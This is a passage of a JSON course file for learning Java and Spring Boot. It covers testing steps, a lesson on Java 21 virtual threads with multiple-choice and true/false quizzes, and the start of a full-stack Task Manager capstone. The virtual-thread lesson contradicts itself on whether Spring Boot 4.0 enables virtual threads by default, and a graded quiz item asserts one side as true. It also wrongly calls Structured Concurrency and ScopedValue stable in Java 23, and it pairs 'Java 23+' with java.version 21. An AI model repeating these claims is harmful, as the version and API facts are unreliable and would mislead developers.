              "content": "Test from DATABASE → FRONTEND:\n\n1. TEST DATABASE:\npsql> SELECT * FROM tasks;\nShould see tasks table\n\n2. TEST REPOSITORY (Unit test):\n@Test\nvoid shouldFindTasksByUserId() {\n    List<Task> tasks = taskRepository.findByUserId(1L);\n    assertFalse(tasks.isEmpty());\n}\n\n3. TEST SERVICE (Unit test):\n@Test\nvoid shouldCreateTask() {\n    Task task = new Task(\"Buy milk\", \"From store\", user);\n    Task saved = taskService.createTask(task, 1L);\n    assertNotNull(saved.getId());\n}\n\n4. TEST API (Integration test or Postman):\nPOST http://localhost:8080/api/tasks\n{\n  \"title\": \"Test task\",\n  \"description\": \"Testing\"\n}\nExpect: 201 Created\n\n5. TEST FRONTEND:\nOpen index.html in browser\n- Create task → Should appear in list\n- Mark complete → Should show checkmark\n- Delete → Should disappear\n\n6. TEST ERROR CASES:\n- No title → Should show error\n- Server down → Should show 'cannot connect'\n- Delete someone else's task → Should return 403"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-8-lesson-7",
          "title": "Lesson 15.7: Virtual Threads (Project Loom) - Modern Concurrency",
          "moduleId": "module-full-stack",
          "order": 7,
          "estimatedMinutes": 55,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Thread-Per-Request is Expensive",
              "content": "Traditional Java web servers use one OS thread per HTTP request:\n\nRequest 1 → Thread 1\nRequest 2 → Thread 2\nRequest 3 → Thread 3\n...\nRequest 1000 → Thread 1000\n\nPROBLEM:\n- Each OS thread costs ~1MB of memory\n- 1000 threads = 1GB of RAM just for threads!\n- Context switching between threads is expensive\n- Most threads spend time WAITING (for database, network)\n\nTraditional server: ~200-500 concurrent connections MAX\n\nThis is why reactive programming (WebFlux) became popular:\n- Don't block threads!\n- But... callback hell, hard to debug, complex code\n\nWhat if we could have MILLIONS of threads that are CHEAP?"
            },
            {
              "type": "KEY_POINT",
              "title": "Virtual Threads are Like Lightweight Waiters",
              "content": "TRADITIONAL THREADS (Platform Threads):\n= Restaurant with 10 waiters\n- Each waiter handles ONE table at a time\n- Customer orders food → waiter WAITS at kitchen door\n- While waiting, waiter can't serve other tables\n- 10 waiters = 10 tables maximum at once\n\nVIRTUAL THREADS:\n= Restaurant with VIRTUAL waiters\n- Waiter takes order, goes to kitchen, PUTS DOWN NOTEPAD\n- While kitchen cooks, waiter serves OTHER tables\n- When food ready, ANY waiter picks up notepad and delivers\n- 10 real waiters can serve 1000 tables!\n\nJava 21 adds Virtual Threads:\n- Managed by JVM, not OS\n- Cost: ~1KB each (vs 1MB for platform threads)\n- Can have MILLIONS of them\n- Write normal blocking code - JVM handles scheduling"
            },
            {
              "type": "THEORY",
              "title": "Creating Virtual Threads in Java 21",
              "content": "BEFORE Java 21 - Platform Thread:\n\nThread platformThread = new Thread(() -> {\n    System.out.println(\"Running on platform thread\");\n});\nplatformThread.start();\n\n// Or with ExecutorService:\nExecutorService executor = Executors.newFixedThreadPool(10);\nexecutor.submit(() -> doWork());\n\nJAVA 21 - Virtual Thread:\n\n// Method 1: Thread.startVirtualThread()\nThread virtualThread = Thread.startVirtualThread(() -> {\n    System.out.println(\"Running on virtual thread!\");\n});\n\n// Method 2: Thread.ofVirtual().start()\nThread vt = Thread.ofVirtual()\n    .name(\"my-virtual-thread\")\n    .start(() -> doWork());\n\n// Method 3: Virtual Thread Executor (RECOMMENDED)\nExecutorService executor = Executors.newVirtualThreadPerTaskExecutor();\nexecutor.submit(() -> doWork());\n\nCHECK IF VIRTUAL:\nThread.currentThread().isVirtual();  // true or false"
            },
            {
              "type": "THEORY",
              "title": "Virtual Threads with ExecutorService",
              "content": "The most practical way to use Virtual Threads:\n\ntry (var executor = Executors.newVirtualThreadPerTaskExecutor()) {\n    // Submit 100,000 tasks - each gets its own virtual thread!\n    List<Future<String>> futures = new ArrayList<>();\n    \n    for (int i = 0; i < 100_000; i++) {\n        final int taskId = i;\n        futures.add(executor.submit(() -> {\n            // Simulate network call (blocks, but that's OK!)\n            Thread.sleep(Duration.ofMillis(100));\n            return \"Result from task \" + taskId;\n        }));\n    }\n    \n    // Collect results\n    for (Future<String> future : futures) {\n        String result = future.get();  // Blocks until complete\n        System.out.println(result);\n    }\n}\n\n// With platform threads: This would need 100,000 MB of RAM!\n// With virtual threads: Runs with minimal memory overhead\n\nPRODUCTION PATTERN:\n@Bean\npublic ExecutorService virtualThreadExecutor() {\n    return Executors.newVirtualThreadPerTaskExecutor();\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "⚠️ What Virtual Threads Are NOT",
              "content": "Virtual Threads DO NOT:\n\n❌ Make CPU-bound code faster\n   Virtual threads help with WAITING (I/O)\n   If you're doing math/compression, use parallel streams\n\n❌ Replace reactive programming entirely\n   Still useful for event-driven systems\n   But now you have a simpler alternative!\n\n❌ Work with synchronized blocks (pinning)\n   More on this later...\n\n❌ Require code changes\n   Existing blocking code works! That's the beauty.\n\nVirtual Threads ARE PERFECT FOR:\n\n✓ Web servers handling many requests\n✓ Database connections\n✓ HTTP client calls\n✓ File I/O operations\n✓ Any code that WAITS for something"
            },
            {
              "type": "THEORY",
              "title": "Spring Boot with Virtual Threads",
              "content": "Virtual Threads in Spring Boot:\n\nSpring Boot 4.0+: Virtual threads require configuration.\nSet spring.threads.virtual.enabled=true in application.properties.\n\nSpring Boot 3.2-3.x: Enable manually:\n# application.properties\nspring.threads.virtual.enabled=true\n\nBEFORE (Platform Threads):\n- Tomcat default: 200 threads\n- 200 concurrent requests max\n- Request 201 waits in queue\n\nAFTER (Virtual Threads):\n- Each request gets its own virtual thread\n- Handle 10,000+ concurrent requests\n- No thread pool exhaustion!\n\nYour existing code works unchanged:\n\n@RestController\npublic class UserController {\n    @GetMapping(\"/api/users/{id}\")\n    public User getUser(@PathVariable Long id) {\n        // This blocks waiting for DB - that's FINE now!\n        return userRepository.findById(id).orElseThrow();\n    }\n}\n\nWith virtual threads enabled:\n- JVM automatically \"parks\" virtual thread during DB wait\n- Platform thread freed to handle other requests\n- Virtual thread \"unparked\" when DB returns\n- You don't change ANY code!"
            },
            {
              "type": "THEORY",
              "title": "Structured Concurrency (Stable in Java 23)",
              "content": "Problem: Running multiple concurrent tasks and handling results/errors:\n\n// Old approach - error prone\nExecutorService executor = Executors.newVirtualThreadPerTaskExecutor();\nFuture<User> userFuture = executor.submit(() -> fetchUser(userId));\nFuture<List<Order>> ordersFuture = executor.submit(() -> fetchOrders(userId));\n\nUser user = userFuture.get();      // What if this throws?\nList<Order> orders = ordersFuture.get();  // This might still be running!\n\n// STRUCTURED CONCURRENCY (Stable in Java 23):\ntry (var scope = new StructuredTaskScope.ShutdownOnFailure()) {\n    \n    Subtask<User> userTask = scope.fork(() -> fetchUser(userId));\n    Subtask<List<Order>> ordersTask = scope.fork(() -> fetchOrders(userId));\n    \n    scope.join();           // Wait for all tasks\n    scope.throwIfFailed();  // Propagate any exception\n    \n    // Both succeeded - get results\n    User user = userTask.get();\n    List<Order> orders = ordersTask.get();\n    \n    return new UserProfile(user, orders);\n}\n// If userTask fails, ordersTask is automatically cancelled!\n// No orphan threads, no resource leaks\n\nNOTE: Structured Concurrency was a preview feature in Java 21-22\nand became stable in Java 23. No --enable-preview flag needed!"
            },
            {
              "type": "KEY_POINT",
              "title": "⚠️ Virtual Thread Pinning - The One Gotcha",
              "content": "PINNING = Virtual thread gets \"stuck\" to platform thread\n\nThis happens with:\n1. synchronized blocks/methods\n2. Native code (JNI)\n\nExample of BAD code:\n\nsynchronized (lock) {\n    // Virtual thread is PINNED here\n    database.query();  // Can't yield to other virtual threads!\n}\n\nFIX - Use ReentrantLock instead:\n\nprivate final ReentrantLock lock = new ReentrantLock();\n\nlock.lock();\ntry {\n    database.query();  // Virtual thread CAN yield here!\n} finally {\n    lock.unlock();\n}\n\nDETECT PINNING:\n# JVM flag to warn about pinning\n-Djdk.tracePinnedThreads=full\n\nCHECKLIST FOR VIRTUAL THREAD READINESS:\n✓ Replace synchronized with ReentrantLock\n✓ Avoid ThreadLocal (use ScopedValue instead - stable in Java 23)\n✓ Don't pool virtual threads (create fresh ones)\n✓ Update JDBC drivers to latest versions\n✓ Check third-party libraries for synchronized usage"
            },
            {
              "type": "THEORY",
              "title": "Performance Comparison: Platform vs Virtual Threads",
              "content": "Benchmark: 10,000 concurrent HTTP requests to REST API\n\nPLATFORM THREADS (200 thread pool):\n- Throughput: ~1,800 req/sec\n- Latency P99: 5,200ms\n- Memory: 800MB\n- Thread contention: HIGH\n\nVIRTUAL THREADS:\n- Throughput: ~9,500 req/sec (5x improvement!)\n- Latency P99: 120ms\n- Memory: 350MB\n- Thread contention: MINIMAL\n\nWHY SO MUCH FASTER?\n1. No thread pool bottleneck\n2. Near-zero context switch cost\n3. Better CPU utilization (threads don't sit idle)\n4. Reduced memory pressure\n\nBUT REMEMBER:\n- Virtual threads don't make SINGLE request faster\n- They make MANY concurrent requests faster\n- CPU-bound code won't benefit\n- I/O-bound code (web servers) benefits MASSIVELY"
            },
            {
              "type": "THEORY",
              "title": "💻 Complete Example: Virtual Thread HTTP Client",
              "content": "```java\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.URI;\nimport java.util.List;\nimport java.util.concurrent.*;\n\npublic class VirtualThreadDemo {\n    \n    public static void main(String[] args) throws Exception {\n        HttpClient client = HttpClient.newHttpClient();\n        List<String> urls = List.of(\n            \"https://api.github.com\",\n            \"https://api.example.com/users\",\n            \"https://api.example.com/orders\"\n            // ... imagine 1000 more URLs\n        );\n        \n        // Fetch ALL URLs concurrently with virtual threads\n        try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {\n            \n            List<Future<String>> futures = urls.stream()\n                .map(url -> executor.submit(() -> fetchUrl(client, url)))\n                .toList();\n            \n            // Collect results\n            for (Future<String> future : futures) {\n                try {\n                    System.out.println(future.get());\n                } catch (ExecutionException e) {\n                    System.err.println(\"Failed: \" + e.getCause());\n                }\n            }\n        }\n    }\n    \n    private static String fetchUrl(HttpClient client, String url) \n            throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(url))\n            .build();\n        \n        HttpResponse<String> response = client.send(\n            request, \n            HttpResponse.BodyHandlers.ofString()\n        );\n        \n        return url + \" -> Status: \" + response.statusCode();\n    }\n}\n\n// This code creates a virtual thread per URL\n// 1000 URLs = 1000 virtual threads (uses ~1MB total, not 1GB!)\n// All requests happen concurrently\n// Simple, readable, blocking code - JVM handles the magic\n```"
            },
            {
              "type": "THEORY",
              "title": "Migration Checklist: Adopting Virtual Threads",
              "content": "STEP 1: Update to Java 23+ and Spring Boot 4.x\n<java.version>21</java.version>\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>4.0.0</version>\n</parent>\n\nSTEP 2: Virtual Threads Configuration\nSpring Boot 4.0+: Enabled by default! No action needed.\nSpring Boot 3.2-3.x: Add spring.threads.virtual.enabled=true\n\nSTEP 3: Update Dependencies\n- JDBC drivers (PostgreSQL 42.7+, MySQL 8.3+)\n- HikariCP (5.1+)\n- Hibernate (6.4+)\n\nSTEP 4: Check for Pinning\n# Run with tracing\njava -Djdk.tracePinnedThreads=full -jar app.jar\n\nSTEP 5: Replace synchronized\n// Before\nsynchronized (this) { ... }\n\n// After\nprivate final ReentrantLock lock = new ReentrantLock();\nlock.lock();\ntry { ... } finally { lock.unlock(); }\n\nSTEP 6: Load Test\n- Use JMeter or Gatling\n- Simulate 10,000 concurrent users\n- Compare metrics before/after\n\nSTEP 7: Monitor in Production\n- Watch thread metrics in Actuator\n- Monitor memory usage\n- Check response times"
            },
            {
              "type": "KEY_POINT",
              "title": "TL;DR - Virtual Threads Summary",
              "content": "WHAT: Lightweight threads managed by JVM (not OS)\nWHY: Handle millions of concurrent connections\nWHEN: Java 21+ (LTS), Spring Boot 3.2+ (enable with spring.threads.virtual.enabled=true)\n\nSpring Boot 4.0+: Virtual threads enabled by default!\nSpring Boot 3.2-3.x: spring.threads.virtual.enabled=true\n\nCreate manually:\nThread.startVirtualThread(() -> doWork());\nExecutors.newVirtualThreadPerTaskExecutor();\n\nBEST FOR:\n✓ Web servers (HTTP requests)\n✓ Microservices\n✓ Database-heavy applications\n✓ API gateways\n✓ Any I/O-bound workload\n\nAVOID:\n✗ CPU-intensive math/processing\n✗ synchronized blocks (use ReentrantLock)\n✗ Pooling virtual threads (create new ones)\n\nIMPACT:\n- 5-10x throughput improvement\n- Simpler code than reactive programming\n- Lower memory usage\n- Better latency under load\n\nThis is the BIGGEST change to Java concurrency since threads were introduced!"
            },
            {
              "type": "WARNING",
              "title": "Virtual Thread Adoption Considerations",
              "content": "PINNING IS STILL A CONCERN:\nJava 21's virtual threads can still be pinned by synchronized blocks.\nFix: Replace synchronized with ReentrantLock for blocking operations.\n\nDON'T POOL VIRTUAL THREADS:\nCreating a fixed pool defeats the purpose of virtual threads.\nFix: Use Executors.newVirtualThreadPerTaskExecutor() - create per task.\n\nTHREAD LOCALS HAVE OVERHEAD:\nVirtual threads copy ThreadLocal values at creation time.\nFix: Consider ScopedValues (stable in Java 23) for request-scoped data.\n\nUPDATE YOUR LIBRARIES:\nOlder JDBC drivers and libraries may not be virtual-thread friendly.\nFix: Use latest versions of PostgreSQL driver (42.7+), HikariCP (5.1+).\n\nMONITOR CARRIER THREAD USAGE:\nIf all carrier threads are pinned, your app will stall.\nFix: Use -Djdk.tracePinnedThreads=full to detect pinning issues."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "epoch-8-lesson-6-vt-basics",
              "title": "Virtual Thread Basics",
              "description": "What is the main advantage of virtual threads over platform threads?",
              "question": "What is the main advantage of virtual threads over platform threads?",
              "options": [
                {
                  "id": "a",
                  "text": "They make CPU-intensive calculations faster",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "They use less memory and allow millions of concurrent threads",
                  "isCorrect": true
                },
                {
                  "id": "c",
                  "text": "They automatically parallelize sequential code",
                  "isCorrect": false
                },
                {
                  "id": "d",
                  "text": "They replace the need for databases",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "epoch-8-lesson-6-pinning",
              "title": "Virtual Thread Pinning",
              "description": "What causes virtual thread pinning and how should you avoid it?",
              "question": "Which of the following should you AVOID when using virtual threads because it causes pinning?",
              "options": [
                {
                  "id": "a",
                  "text": "Using ReentrantLock for synchronization",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "Using synchronized blocks or methods",
                  "isCorrect": true
                },
                {
                  "id": "c",
                  "text": "Making HTTP calls with HttpClient",
                  "isCorrect": false
                },
                {
                  "id": "d",
                  "text": "Using try-with-resources blocks",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "TRUE_FALSE",
              "id": "epoch-8-lesson-6-spring",
              "title": "Spring Boot Virtual Threads",
              "description": "Spring Boot 4.0 has virtual threads enabled by default.",
              "statement": "In Spring Boot 4.0+, virtual threads are enabled by default for all HTTP request handling (in 3.2-3.x, you need to set spring.threads.virtual.enabled=true)",
              "isTrue": true,
              "explanation": "Correct! Spring Boot 3.2 introduced virtual thread support with a configuration property. Spring Boot 4.0 made virtual threads the default, so no configuration is needed with Java 21+.",
              "difficulty": "beginner"
            }
          ]
        }
      ],
      "order": 15
    },
    {
      "id": "module-16",
      "title": "Capstone Project: Task Manager Application",
      "description": "Build a complete full-stack Task Manager application from scratch. Apply everything you've learned: Spring Boot, JPA, REST APIs, React frontend, authentication, and deployment.",
      "difficulty": "advanced",
      "estimatedHours": 12,
      "lessons": [
        {
          "id": "capstone-lesson-1",
          "title": "Lesson 16.1: Project Requirements & Architecture",
          "moduleId": "module-16",
          "order": 1,
          "estimatedMinutes": 45,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Introduction to the Task Manager Project",
              "content": "Welcome to the capstone project! Over the next 9 lessons, you will build a complete, production-ready Task Manager application from scratch. This is not a toy project - it is a full-stack application that demonstrates every skill you have learned throughout this course.\n\nThe Task Manager allows users to organize their work through tasks, categories, and priorities. Users can register, log in securely, create and manage tasks, organize them by category, set due dates, and track their progress. The application features a modern React frontend communicating with a Spring Boot REST API, all backed by a PostgreSQL database.\n\nWhy a Task Manager? This project type is perfect for demonstrating your skills because it requires:\n- User authentication and authorization (security)\n- CRUD operations on multiple related entities (database design)\n- Complex business logic (task filtering, sorting, status updates)\n- A responsive user interface (frontend development)\n- RESTful API design (backend architecture)\n- Real-world deployment concerns (Docker, CI/CD)\n\nBy the end of this capstone, you will have a portfolio-worthy project that showcases your ability to build complete applications. Employers specifically look for projects that demonstrate end-to-end thinking - and this project does exactly that.\n\nLet us begin by understanding what we are building and how all the pieces fit together."
            },
            {
              "type": "THEORY",
              "title": "User Stories and Requirements",
              "content": "Every professional project starts with clear requirements. We will define ours through user stories - descriptions of features from the user's perspective.\n\nAuthentication Stories:\n- As a new user, I want to register with my email and password so that I can access the application.\n- As a registered user, I want to log in securely so that I can manage my tasks.\n- As a logged-in user, I want to log out so that my session is terminated securely.\n- As a user, I want my password stored securely (hashed) so that my account is protected.\n\nTask Management Stories:\n- As a user, I want to create tasks with a title, description, due date, and priority so that I can track my work.\n- As a user, I want to view all my tasks in a list so that I can see what needs to be done.\n- As a user, I want to edit my tasks so that I can update information as things change.\n- As a user, I want to delete tasks I no longer need so that my list stays clean.\n- As a user, I want to mark tasks as complete so that I can track my progress.\n- As a user, I want to filter tasks by status (pending, completed) so that I can focus on what matters.\n- As a user, I want to sort tasks by due date or priority so that I can prioritize effectively.\n\nCategory Management Stories:\n- As a user, I want to create categories (Work, Personal, Health, etc.) so that I can organize my tasks.\n- As a user, I want to assign tasks to categories so that related tasks are grouped together.\n- As a user, I want to filter tasks by category so that I can focus on one area at a time.\n\nThese user stories will guide our development. Each feature we build should directly support one or more of these stories. This is how professional teams work - requirements drive development."
            },
            {
              "type": "THEORY",
              "title": "Data Model: User, Task, and Category Entities",
              "content": "Before writing any code, we must design our data model. The data model defines what information we store and how entities relate to each other.\n\nUser Entity:\nThe User represents a registered account in our system. Each user has:\n- id: Unique identifier (auto-generated)\n- email: User's email address (unique, used for login)\n- password: Hashed password (never store plain text!)\n- name: User's display name\n- role: USER or ADMIN (for authorization)\n- createdAt: When the account was created\n- tasks: List of tasks owned by this user\n- categories: List of categories created by this user\n\nTask Entity:\nThe Task represents a single work item. Each task has:\n- id: Unique identifier\n- title: Short description of the task (required)\n- description: Detailed notes about the task (optional)\n- status: PENDING, IN_PROGRESS, or COMPLETED\n- priority: LOW, MEDIUM, HIGH, or URGENT\n- dueDate: When the task should be completed (optional)\n- createdAt: When the task was created\n- updatedAt: When the task was last modified\n- owner: The User who owns this task\n- category: The Category this task belongs to (optional)\n\nCategory Entity:\nThe Category helps organize tasks into groups. Each category has:\n- id: Unique identifier\n- name: Category name (e.g., \"Work\", \"Personal\")\n- description: What this category is for (optional)\n- color: Hex color code for UI display (e.g., \"#3B82F6\")\n- owner: The User who created this category\n- tasks: List of tasks in this category\n\nRelationships:\n- One User has many Tasks (one-to-many)\n- One User has many Categories (one-to-many)\n- One Category has many Tasks (one-to-many)\n- One Task belongs to one User (many-to-one)\n- One Task optionally belongs to one Category (many-to-one)\n\nThis normalized design prevents data duplication and maintains referential integrity. When we delete a User, their Tasks and Categories are also deleted (cascade). When we delete a Category, Tasks in that category have their category set to null (set null)."
            },
            {
              "type": "KEY_POINT",
              "title": "Architecture Overview: React + Spring Boot + PostgreSQL",
              "content": "Our application follows the modern three-tier architecture pattern:\n\nPresentation Tier (Frontend):\n- Technology: React 18+ with TypeScript\n- Responsibility: User interface and user experience\n- Communicates with: Backend via REST API (HTTP/JSON)\n- Features: Component-based UI, state management, form validation, responsive design\n\nApplication Tier (Backend):\n- Technology: Spring Boot 3.2+ with Java 21+\n- Responsibility: Business logic, security, data validation, API endpoints\n- Components:\n  - Controllers: Handle HTTP requests, route to services\n  - Services: Implement business logic, coordinate operations\n  - Repositories: Database access layer (Spring Data JPA)\n  - DTOs: Data transfer objects for API requests/responses\n  - Security: JWT authentication, authorization rules\n\nData Tier (Database):\n- Technology: PostgreSQL 16\n- Responsibility: Persistent data storage, data integrity, queries\n- Managed by: Flyway for schema migrations\n- Accessed by: Spring Data JPA repositories\n\nCommunication Flow:\n1. User interacts with React UI\n2. React sends HTTP request to Spring Boot API\n3. Spring Security validates JWT token\n4. Controller receives request, validates input\n5. Service executes business logic\n6. Repository queries/updates PostgreSQL\n7. Response flows back through layers to React\n8. React updates UI with new data\n\nThis separation of concerns makes our application maintainable, testable, and scalable. Each tier can be developed, tested, and deployed independently."
            },
            {
              "type": "THEORY",
              "title": "Project Structure and Module Organization",
              "content": "A well-organized project structure makes code easier to navigate, maintain, and scale. Here is how we will organize our Task Manager:\n\nBackend Structure (Spring Boot):\ntaskmanager-api/\n  src/main/java/com/taskmanager/\n    TaskManagerApplication.java       # Main entry point\n    config/                            # Configuration classes\n      SecurityConfig.java              # Spring Security setup\n      WebConfig.java                   # CORS, converters\n    controller/                        # REST endpoints\n      AuthController.java              # Login, register, logout\n      TaskController.java              # Task CRUD operations\n      CategoryController.java          # Category CRUD operations\n    service/                           # Business logic\n      AuthService.java                 # Authentication logic\n      TaskService.java                 # Task operations\n      CategoryService.java             # Category operations\n    repository/                        # Database access\n      UserRepository.java\n      TaskRepository.java\n      CategoryRepository.java\n    model/                             # JPA entities\n      User.java\n      Task.java\n      Category.java\n      enums/                           # Enumerations\n        Role.java\n        TaskStatus.java\n        Priority.java\n    dto/                               # Data transfer objects\n      request/                         # Incoming data\n        TaskRequest.java\n        LoginRequest.java\n      response/                        # Outgoing data\n        TaskResponse.java\n        UserResponse.java\n    exception/                         # Custom exceptions\n      ResourceNotFoundException.java\n      UnauthorizedException.java\n    security/                          # JWT and auth\n      JwtTokenProvider.java\n      JwtAuthenticationFilter.java\n  src/main/resources/\n    application.yml                    # Configuration\n    db/migration/                      # Flyway migrations\n      V1__create_users.sql\n      V2__create_categories.sql\n      V3__create_tasks.sql\n\nFrontend Structure (React):\ntaskmanager-ui/\n  src/\n    components/                        # Reusable UI components\n      TaskCard.tsx\n      CategoryBadge.tsx\n      Header.tsx\n    pages/                             # Page components\n      LoginPage.tsx\n      DashboardPage.tsx\n      TasksPage.tsx\n    hooks/                             # Custom React hooks\n      useAuth.ts\n      useTasks.ts\n    services/                          # API communication\n      api.ts\n      authService.ts\n      taskService.ts\n    types/                             # TypeScript interfaces\n      Task.ts\n      User.ts\n    context/                           # React context\n      AuthContext.tsx\n\nThis structure follows industry best practices: separation by feature type, clear naming conventions, and logical grouping of related files."
            },
            {
              "type": "WARNING",
              "title": "Common Architecture Mistakes to Avoid",
              "content": "As you build this project, watch out for these common pitfalls:\n\nMistake 1: Exposing Entities Directly in API\nProblem: Returning JPA entities from controllers exposes internal details (like password hashes) and creates tight coupling.\nSolution: Always use DTOs for API requests and responses.\n\nMistake 2: Business Logic in Controllers\nProblem: Putting validation and business rules in controllers makes them hard to test and reuse.\nSolution: Controllers should only handle HTTP concerns. Move logic to services.\n\nMistake 3: N+1 Query Problem\nProblem: Loading relationships lazily in a loop causes hundreds of database queries.\nSolution: Use JOIN FETCH in JPQL queries or @EntityGraph for eager loading when needed.\n\nMistake 4: Storing Plain Text Passwords\nProblem: If database is breached, all passwords are exposed.\nSolution: Always hash passwords with BCrypt before storing.\n\nMistake 5: No Input Validation\nProblem: Malicious or malformed data can corrupt your database or crash your application.\nSolution: Use Bean Validation (@NotBlank, @Email, @Size) on all request DTOs.\n\nMistake 6: Hardcoding Configuration\nProblem: Database URLs, secrets in code makes deployment difficult and insecure.\nSolution: Use application.yml with environment variable substitution.\n\nMistake 7: No Error Handling\nProblem: Unhandled exceptions expose stack traces to users (security risk) and provide poor UX.\nSolution: Use @ControllerAdvice for global exception handling with proper error responses.\n\nWe will address all of these concerns as we build the application. Keep this list handy as a checklist."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-1-architecture",
              "title": "Understanding the Three-Tier Architecture",
              "description": "Test your understanding of how the application tiers communicate.",
              "question": "In our Task Manager architecture, which component is responsible for converting a TaskRequest DTO into a Task entity and saving it to the database?",
              "options": [
                {
                  "id": "a",
                  "text": "TaskController - it receives the request and should handle everything",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "TaskService - it implements business logic and coordinates with the repository",
                  "isCorrect": true
                },
                {
                  "id": "c",
                  "text": "TaskRepository - it handles all database operations",
                  "isCorrect": false
                },
                {
                  "id": "d",
                  "text": "React frontend - it prepares data before sending to the API",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-1-relationships",
              "title": "Entity Relationships",
              "description": "Understand how entities relate to each other in our data model.",
              "question": "What happens to a user's tasks when we delete that user from the database, based on our data model design?",
              "options": [
                {
                  "id": "a",
                  "text": "The tasks remain in the database with a null owner",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "The deletion fails because tasks still reference the user",
                  "isCorrect": false
                },
                {
                  "id": "c",
                  "text": "The tasks are also deleted (cascade delete)",
                  "isCorrect": true
                },
                {
                  "id": "d",
                  "text": "The tasks are automatically assigned to an admin user",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "capstone-lesson-2",
          "title": "Lesson 16.2: Backend Setup & Data Layer",
          "moduleId": "module-16",
          "order": 2,
          "estimatedMinutes": 60,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Creating the Spring Boot Project",
              "content": "Let us set up our backend project using Spring Initializr. We will configure all the dependencies we need for a production-ready application.\n\nUsing Spring Initializr (start.spring.io):\n\nProject Configuration:\n- Project: Maven\n- Language: Java\n- Spring Boot: 3.2.x (or latest stable)\n- Group: com.taskmanager\n- Artifact: taskmanager-api\n- Packaging: Jar\n- Java: 21\n\nDependencies to Add:\n1. Spring Web - REST API endpoints, embedded Tomcat\n2. Spring Data JPA - Database access, repository pattern\n3. Spring Security - Authentication, authorization\n4. PostgreSQL Driver - Database connectivity\n5. Validation - Input validation (@NotBlank, @Email)\n6. Flyway Migration - Database schema versioning\n7. Spring Boot DevTools - Hot reload during development\n8. Lombok - Reduce boilerplate (optional but recommended)\n\nAfter generating the project, your pom.xml will include all these dependencies. The project structure follows Maven conventions with src/main/java for code and src/main/resources for configuration.\n\nImportant: Before running the application, we need to configure the database connection in application.yml. Without this, Spring Boot cannot start because Spring Data JPA requires a datasource."
            },
            {
              "type": "THEORY",
              "title": "Application Configuration",
              "content": "Create your application.yml file in src/main/resources. This YAML configuration is more readable than properties files and supports hierarchical structure.\n\n```yaml\nspring:\n  application:\n    name: taskmanager-api\n  \n  datasource:\n    url: jdbc:postgresql://localhost:5432/taskmanager\n    username: ${DB_USERNAME:taskuser}\n    password: ${DB_PASSWORD:localdev123}\n    driver-class-name: org.postgresql.Driver\n  \n  jpa:\n    hibernate:\n      ddl-auto: validate  # Use Flyway for migrations\n    show-sql: true\n    properties:\n      hibernate:\n        format_sql: true\n        dialect: org.hibernate.dialect.PostgreSQLDialect\n  \n  flyway:\n    enabled: true\n    locations: classpath:db/migration\n    baseline-on-migrate: true\n\nserver:\n  port: 8080\n\nlogging:\n  level:\n    com.taskmanager: DEBUG\n    org.springframework.security: DEBUG\n```\n\nKey Configuration Explained:\n\n- datasource.url: JDBC connection string. Uses environment variables with defaults for local development.\n- jpa.hibernate.ddl-auto: Set to 'validate' because Flyway manages schema changes. Never use 'create' or 'update' in production!\n- flyway.enabled: Enables automatic migration on startup. Flyway runs SQL scripts in order.\n- Environment Variables: ${DB_PASSWORD:localdev123} means \"use DB_PASSWORD if set, otherwise use localdev123\". This allows different values per environment."
            },
            {
              "type": "THEORY",
              "title": "JPA Entity: User",
              "content": "Now let us create our first entity. The User entity represents registered accounts and is the foundation for authentication and task ownership.\n\n```java\npackage com.taskmanager.model;\n\nimport jakarta.persistence.*;\nimport java.time.LocalDateTime;\nimport java.util.ArrayList;\nimport java.util.List;\n\n@Entity\n@Table(name = \"users\")\npublic class User {\n    \n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(unique = true, nullable = false, length = 255)\n    private String email;\n    \n    @Column(nullable = false)\n    private String password;\n    \n    @Column(length = 100)\n    private String name;\n    \n    @Enumerated(EnumType.STRING)\n    @Column(nullable = false)\n    private Role role = Role.USER;\n    \n    @Column(name = \"created_at\", updatable = false)\n    private LocalDateTime createdAt;\n    \n    @OneToMany(mappedBy = \"owner\", cascade = CascadeType.ALL, orphanRemoval = true)\n    private List<Task> tasks = new ArrayList<>();\n    \n    @OneToMany(mappedBy = \"owner\", cascade = CascadeType.ALL, orphanRemoval = true)\n    private List<Category> categories = new ArrayList<>();\n    \n    // Default constructor required by JPA\n    public User() {}\n    \n    public User(String email, String password, String name) {\n        this.email = email;\n        this.password = password;\n        this.name = name;\n        this.role = Role.USER;\n    }\n    \n    @PrePersist\n    protected void onCreate() {\n        this.createdAt = LocalDateTime.now();\n    }\n    \n    // Getters and setters\n    public Long getId() { return id; }\n    public void setId(Long id) { this.id = id; }\n    \n    public String getEmail() { return email; }\n    public void setEmail(String email) { this.email = email; }\n    \n    public String getPassword() { return password; }\n    public void setPassword(String password) { this.password = password; }\n    \n    public String getName() { return name; }\n    public void setName(String name) { this.name = name; }\n    \n    public Role getRole() { return role; }\n    public void setRole(Role role) { this.role = role; }\n    \n    public LocalDateTime getCreatedAt() { return createdAt; }\n    \n    public List<Task> 